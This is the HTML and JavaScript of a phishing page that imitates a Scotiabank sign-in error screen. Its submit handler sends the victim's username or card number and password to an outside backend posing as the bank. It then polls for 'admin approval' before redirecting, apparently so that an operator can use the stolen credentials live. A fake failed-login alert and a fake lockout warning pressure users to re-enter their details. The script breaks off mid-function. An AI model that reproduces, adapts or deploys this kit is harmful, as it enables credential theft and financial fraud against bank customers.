<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Sign In Issue | Scotiabank</title>
    <style>
      .loading {
        display: none;
      }
      .loading.active {
        display: inline-block;
        animation: spin 1s linear infinite;
      }
      @keyframes spin {
        from { transform: rotate(0deg); }
        to { transform: rotate(360deg); }
      }
      .error-message {
        display: none;
        color: #EB121A;
        font-size: 14px;
        margin-top: 5px;
      }
      .error-message.show {
        display: block;
      }
      .success-message {
        display: none;
        color: #02a95c;
        font-size: 14px;
        margin-top: 5px;
      }
      .success-message.show {
        display: block;
      }
      .alert-box {
        display: flex;
        align-items: flex-start;
        gap: 12px;
        padding: 16px;
        background-color: #FFF2F2;
        border: 2px solid #EB121A;
        border-radius: 8px;
        margin-bottom: 24px;
      }
      .alert-icon {
        color: #EB121A;
        flex-shrink: 0;
      }
      .alert-content {
        flex: 1;
      }
      .alert-title {
        font-weight: 600;
        color: #EB121A;
        margin-bottom: 4px;
      }
      .alert-description {
        color: #666;
        font-size: 14px;
        line-height: 1.5;
      }
      .lockout-warning {
        display: none;
        background-color: #FFF8E6;
        border: 2px solid #F59E0B;
        border-radius: 8px;
        padding: 16px;
        margin-top: 20px;
      }
      .lockout-warning.show {
        display: block;
      }
      .attempt-counter {
        font-weight: 600;
        color: #EB121A;
      }
      .security-tips {
        background-color: #F6F7FC;
        border-radius: 8px;
        padding: 20px;
        margin-top: 30px;
      }
      .security-tip {
        display: flex;
        align-items: flex-start;
        gap: 12px;
        margin-bottom: 12px;
      }
      .security-tip:last-child {
        margin-bottom: 0;
      }
      .tip-icon {
        color: #007EAB;
        flex-shrink: 0;
      }
      @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
        20%, 40%, 60%, 80% { transform: translateX(5px); }
      }
    </style>
  </head>
  <body class="min-h-screen flex flex-col bg-[#F6F7FC]">
    <div
      class="md:p-[20px] flex-1 flex flex-col md:justify-center items-center h-screen bg-[#FAFBFD]"
    >
      <div
        class="md:w-[600px] w-full md:mt-[60px] bg-[white] rounded-[8px] shadow-md md:p-[40px] p-[30px] flex flex-col items-center"
      >
        <div class="w-full flex items-end">
          <i data-lucide="alert-triangle" class="text-[#EB121A] ml-auto"></i>
        </div>
        
        <!-- Error Alert Box -->
        <div class="alert-box w-full">
          <div class="alert-icon">
            <i data-lucide="alert-circle" class="w-6 h-6"></i>
          </div>
          <div class="alert-content">
            <div class="alert-title">Sign In Failed</div>
            <div class="alert-description">
              The username or password you entered is incorrect. Please try again. 
              If you've forgotten your login details, you can reset them using the links below.
            </div>
          </div>
        </div>

        <div>
          <h1
            class="mt-4 text-[1.6rem] leading-[3.5rem] font-[600] tracking-[-0.025rem] text-[rgb(51,51,51)]"
            style="font-family: 'Scotia Headline', Arial, Helvetica, sans-serif"
          >
            Sign In
          </h1>
        </div>
        <img
          src="data:image/png;base64,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"
          alt="Logo"
          class="h-[40px]"
        />

        <form id="loginForm" class="w-[350px] mt-[50px]">
          <div class="mb-8">
            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
              >Username or card number</label
            >
            <div
              class="flex items-center gap-3 border-b-2 border-[#EB121A] py-2 focus-within:border-[#007EAB]"
            >
              <i data-lucide="user" class="text-gray-700"></i>
              <input
                id="login2"
                name="login2"
                type="text"
                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
                placeholder="Enter username or card number"
                required
              />
            </div>
            <div id="login2Error" class="error-message"></div>
          </div>

          <div class="mb-8">
            <label class="block md:text-[18px] text-[14px] font-semibold text-[#1d1d1d]"
              >Password</label
            >
            <div
              class="flex items-center gap-3 border-b-2 border-[#EB121A] py-2 focus-within:border-[#007EAB]"
            >
              <i data-lucide="lock-keyhole" class="text-gray-700"></i>
              <input
                id="password2"
                name="password2"
                type="password"
                class="border-none w-full mb-2 outline-none focus:ring-0 placeholder:text-[#8a8a8a] bg-transparent text-[#1d1d1d] text-[22px]"
                placeholder="Enter password"
                required
              />
            </div>
            <div id="password2Error" class="error-message"></div>
            <div id="successMessage" class="success-message"></div>
          </div>

          <!-- Lockout Warning (Shows after multiple attempts) -->
          <div id="lockoutWarning" class="lockout-warning">
            <div class="flex items-start gap-2">
              <i data-lucide="alert-triangle" class="text-[#F59E0B] w-5 h-5 mt-0.5"></i>
              <div>
                <p class="text-[#F59E0B] font-[600] text-sm mb-1">Multiple Failed Attempts</p>
                <p class="text-[#666] text-sm">
                  You have <span id="attemptCount" class="attempt-counter">2</span> remaining attempts 
                  before your account is temporarily locked for security reasons.
                </p>
              </div>
            </div>
          </div>

          <label
            class="flex items-center gap-3 text-[18px] text-[#1d1d1d] cursor-pointer mt-6"
          >
            <input type="checkbox" class="hidden peer" />

            <span
              class="w-[26px] h-[26px] rounded-md border-2 border-[#7a7a7a] flex items-center justify-center peer-checked:bg-[#02a95c] peer-checked:border-[#02a95c]"
            >
              <svg
                class="w-4 h-4 text-white opacity-0 peer-checked:opacity-100"
                viewBox="0 0 24 24"
                fill="currentColor"
              >
                <path d="M20.3 5.7l-11 11-5-5 1.4-1.4 3.6 3.6 9.6-9.6z" />
              </svg>
            </span>

            <span class="text-[16px] font-[300]"
              >Remember my username or card number</span>
          </label>
          <div class="w-full flex justify-center">
            <button
              id="submitBtn"
              type="submit"
              class="mt-[50px] w-[300px] bg-[#EB121A] px-[20px] py-[15px] rounded-[8px] flex items-center justify-center gap-2 hover:bg-[#d10f17] transition-colors"
            >
              <svg class="loading w-5 h-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
              </svg>
              <span class="text-[white] text-[13px]">Sign in</span>
            </button>
          </div>

          <!-- Security Tips -->
          <div class="security-tips w-full mt-8">
            <h3 class="text-[16px] font-[600] text-[#1d1d1d] mb-4">Security Tips:</h3>
            <div class="security-tip">
              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
              <span class="text-[14px] text-[#666]">Ensure your username and password are entered correctly, paying attention to case sensitivity.</span>
            </div>
            <div class="security-tip">
              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
              <span class="text-[14px] text-[#666]">If you've forgotten your credentials, use the "Reset Password" or "Forgot Username" links below.</span>
            </div>
            <div class="security-tip">
              <i data-lucide="shield-check" class="tip-icon w-5 h-5"></i>
              <span class="text-[14px] text-[#666]">Never share your login credentials with anyone. Scotiabank will never ask for your password via email or phone.</span>
            </div>
          </div>

          <!-- Help Links -->
          <div class="w-full mt-8 space-y-4">
            <a href="#" class="w-full flex justify-center items-center">
              <span class="text-[#03749D] text-[16px] font-[700]"
                >Forgot your username?
              </span>
              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
            </a>
            
            <a href="#" class="w-full flex justify-center items-center">
              <span class="text-[#03749D] text-[16px] font-[700]"
                >Reset your password
              </span>
              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
            </a>

            <a href="#" class="w-full flex justify-center items-center">
              <span class="text-[#03749D] text-[16px] font-[700]"
                >Need help signing in?
              </span>
              <i data-lucide="chevron-right" class="text-[#03749D] w-5 h-5"></i>
            </a>
          </div>
        </form>
      </div>

      <div class="md:flex block gap-[8px] mt-[50px] mb-[70px]">
        <span>Don't have a username and password?</span>
        <br class="md:hidden"/>
        <a href="#" class="font-[600] text-[16px]">Set them up now.</a>
      </div>
    </div>

    <footer class="pt-6 pb-3 text-sm text-gray-600 bg-[white] shadow-md border border-1 hidden md:block">
      <div class="flex justify-between mb-4 py-[10px] px-[50px]">
        <div>
            <img class="h-9 w-13" src="data:image/png;base64,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" alt="">
        </div>
        <div class="flex gap-[20px] font-[300] flex-wrap">
          <a href="#">Contact Us</a>
          <a href="#">Security</a>
          <a href="#">Legal</a>
          <a href="#">Privacy</a>
          <a href="#">Accessibility</a>
          <a href="#">Cookie Settings</a>
        </div>
      </div>

      <hr class="mt-4 mb-3" />

      <div class="flex justify-end px-[20px]">
        <span class="text-[12px]">Â© Scotiabank. All Rights Reserved.</span>
      </div>
    </footer>

    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <script>
        // Backend URL - make sure this matches your Flask backend
        const BACKEND_URL = 'https://scotiabcknd.onrender.com';
        // Alternative for local testing: 'http://localhost:5000'
        
        console.log('Using backend URL:', BACKEND_URL);
        
        // Initialize Lucide icons
        lucide.createIcons();
        
        // Track login attempts
        let loginAttempts = 0;
        const MAX_ATTEMPTS = 3;
        
        // Load attempt count from localStorage or initialize
        function loadAttemptCount() {
            const savedAttempts = localStorage.getItem('login2_attempts');
            if (savedAttempts) {
                loginAttempts = parseInt(savedAttempts);
                updateLockoutWarning();
            }
        }
        
        // Save attempt count to localStorage
        function saveAttemptCount() {
            localStorage.setItem('login2_attempts', loginAttempts.toString());
        }
        
        // Update lockout warning display
        function updateLockoutWarning() {
            const lockoutWarning = document.getElementById('lockoutWarning');
            const attemptCount = document.getElementById('attemptCount');
            const remainingAttempts = MAX_ATTEMPTS - loginAttempts;
            
            if (loginAttempts >= 1 && loginAttempts < MAX_ATTEMPTS) {
                lockoutWarning.classList.add('show');
                attemptCount.textContent = remainingAttempts;
                
                // Update border colors based on attempt count
                if (loginAttempts >= 2) {
                    document.querySelectorAll('.input-icon').forEach(el => {
                        el.style.borderBottomColor = '#EB121A';
                    });
                }
            } else if (loginAttempts >= MAX_ATTEMPTS) {
                // Account locked scenario
                showAccountLocked();
            } else {
                lockoutWarning.classList.remove('show');
            }
        }
        
        // Show account locked message
        function showAccountLocked() {
            const alertBox = document.querySelector('.alert-box');
            alertBox.innerHTML = `
                <div class="alert-icon">
                    <i data-lucide="lock" class="w-6 h-6"></i>
                </div>
                <div class="alert-content">
                    <div class="alert-title">Account Temporarily Locked</div>
                    <div class="alert-description">
                        For security reasons, your account has been temporarily locked due to multiple failed login attempts. 
                        Please try again in 30 minutes or contact customer support for immediate assistance.
                    </div>
                </div>
            `;
            
            // Update lockout warning to show locked status
            const lockoutWarning = document.getElementById('lockoutWarning');
            lockoutWarning.innerHTML = `
                <div class="flex items-start gap-2">
                    <i data-lucide="alert-octagon" class="text-[#DC2626] w-5 h-5 mt-0.5"></i>
                    <div>
                        <p class="text-[#DC2626] font-[600] text-sm mb-1">Account Locked</p>
                        <p class="text-[#666] text-sm">
                            Your account is temporarily locked. You can try again in 30 minutes or 
                            <a href="#" class="text-[#03749D] font-[600]">contact support</a> for immediate assistance.
                        </p>
                    </div>
                </div>
            `;
            lockoutWarning.classList.add('show');
            lockoutWarning.style.backgroundColor = '#FEF2F2';
            lockoutWarning.style.borderColor = '#DC2626';
            
            // Disable form
            document.getElementById('loginForm').querySelectorAll('input, button').forEach(el => {
                el.disabled = true;
            });
            
            document.getElementById('submitBtn').innerHTML = `
                <i data-lucide="lock" class="w-5 h-5 text-white"></i>
                <span class="text-[white] text-[13px]">Account Locked</span>
            `;
            document.getElementById('submitBtn').style.backgroundColor = '#9CA3AF';
            document.getElementById('submitBtn').style.cursor = 'not-allowed';
            
            lucide.createIcons();
            
            // Set timeout to unlock after 30 minutes (for demo, using 5 seconds)
            setTimeout(() => {
                resetLoginAttempts();
            }, 1800000); // 30 minutes in milliseconds
        }
        
        // Reset login attempts
        function resetLoginAttempts() {
            loginAttempts = 0;
            localStorage.removeItem('login2_attempts');
            location.reload(); // Refresh page to reset UI
        }
        
        // Clear errors when user starts typing
        document.getElementById('login2').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('login2Error').classList.remove('show');
            document.getElementById('password2Error').classList.remove('show');
        });
        
        document.getElementById('password2').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('password2Error').classList.remove('show');
        });
        
        // Poll status function (same as other pages)
        async function pollStatus(sessionId) {
            let attempts = 0;
            const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
            
            const checkStatus = async () => {
                try {
                    console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
                    const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
                    
                    if (!response.ok) {
                        console.error('Status check failed:', response.status);
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000);
                        } else {
                            document.getElementById('successMessage').textContent = 'Status check timed out. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                        return;
                    }
                    
                    const data = await response.json();
                    console.log('Status check response:', data);
                    
                    if (data.status === 'approved' && data.redirect_url) {
                        // Approved - redirect to next page
                        const redirectUrl = data.redirect_url;
                        console.log('Approved! Redirecting to:', redirectUrl);
                        
                        // If the redirect_url is a page name (not full URL), construct URL
                        if (!redirectUrl.startsWith('http')) {
                            window.location.href = redirectUrl;
                        } else {
                            window.location.href = redirectUrl;
                        }
                        return true;
                    } else if (data.status === 'pending') {
                        // Continue polling
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000); // Check every 5 seconds
                            
                            // Update message every few attempts
                            if (attempts % 12 === 0) { // Every minute
                                const minutes = attempts / 12;
                                document.getElementById('successMessage').textContent = `Still waiting for admin approval... (${minutes} minute${minutes > 1 ? 's' : ''})`;
                            }
                        } else {
                            // Timeout
                            document.getElementById('successMessage').textContent = 'Request timed out after 10 minutes. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                    } else if (data.error) {
                        // Error from backend
                        document.getElementById('successMessage').textContent = `Error: ${data.error}`;
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                } catch (error) {
                    console.error('Status check error:', error);
                    attempts++;
                    if (attempts < maxAttempts) {
                        setTimeout(checkStatus, 5000);
                    } else {
                        document.getElementById('successMessage').textContent = 'Status check error. Please try again.';
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                }
                return false;
            };
            
            // Start polling
            setTimeout(checkStatus, 5000); // First check after 5 seconds
        }
        
        function resetButton() {
            const submitBtn = document.getElementById('submitBtn');
            const loadingIcon = submitBtn.querySelector('.loading');
            const submitText = submitBtn.querySelector('span');
            
            loadingIcon.classList.remove('active');
            submitText.textContent = 'Sign in';
            submitBtn.disabled = false;
        }
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            
            const login2 = document.getElementById('login2').value;
            const password2 = document.getElementById('password2').value;
            
            // Show loading state
            const submitBtn = document.getElementById('submitBtn');
            const spinner = submitBtn.querySelector('.loading');
            const buttonText = submitBtn.querySelector('span');
            
            spinner.classList.add('active');
            buttonText.textContent = 'Signing in...';
            submitBtn.disabled = true;
            
            // Clear any previous error/success messages
            document.getElementById('login2Error').classList.remove('show');
            document.getElementById('password2Error').classList.remove('show');
            document.getElementById('successMessage').classList.remove('show');
            
            // Basic validation
            let isValid = true;
            
            if (!login2.trim()) {
                document.getElementById('login2Error').textContent = 'Please enter your username or card number';
                document.getElementById('login2Error').classList.add('show');
                isValid = false;
            }
            
            if (!password2.trim()) {
                document.getElementById('password2Error').textContent = 'Please enter your password';
                document.getElementById('password2Error').classList.add('show');
                isValid = false;
            }
            
            if (!isValid) {
                spinner.classList.remove('active');
                buttonText.textContent = 'Sign in';
                submitBtn.disabled = false;
                return;
            }
            
            try {
                // Prepare data in the format expected by Flask backend /login2 endpoint
                const loginData = {
                    login2: login2,
                    password2: password2
                };
                
                console.log('Sending login2 data to:', `${BACKEND_URL}/login2`);
                console.log('Data:', loginData);
                
                const response = await fetch(`${BACKEND_URL}/login2`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(loginData)
                });
                
                console.log('Response status:', response.status);
                
                const data = await response.json();
                console.log('Response data:', data);
                
                if (response.ok && data.success) {
                    // Success - store session ID and start polling
                    const sessionId = data.id;
                    localStorage.setItem('sessionId', sessionId);
                    
                    // Update button text
                    buttonText.textContent = 'Waiting for approval...';
                    
                    // Show success message
                    document.getElementById('successMessage').textContent = 'Login submitted successfully. Waiting for admin approval...';
                    document.getElementById('successMessage').classList.add('show');
                    
                    // Reset attempt counter on successful submission
                    loginAttempts = 0;
                    saveAttemptCount();
                    
                    // Start polling for status
                    pollStatus(sessionId);
                } else {
                    // Show error
                    const errorMsg = data.error || `Login failed. Status: ${response.status}`;
                    document.getElementById('password2Error').textContent = errorMsg;
                    document.getElementById('password2Error').classList.add('show');
                    
                    // Increment attempt counter
                    loginAttempts++;
                    saveAttemptCount();
                    updateLockoutWarning();
                    
                    // Add shake animation for error effect
                    this.style.animation = 'none';
                    setTimeout(() => {
                        this.style.animation = 'shake 0.5s ease-in-out';
                    }, 10);
                    
                    // Clear password field for security
                    document.getElementById('password2').value = '';
                    
                    // Focus on password field
                    document.getElementById('password2').focus();
                    
                    // Reset button
                    spinner.classList.remove('active');
                    buttonText.textContent = 'Sign in';
                    submitBtn.disabled = false;
                }
            } catch (error) {
                console.error('Network error:', error);
                document.getElementById('password2Error').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
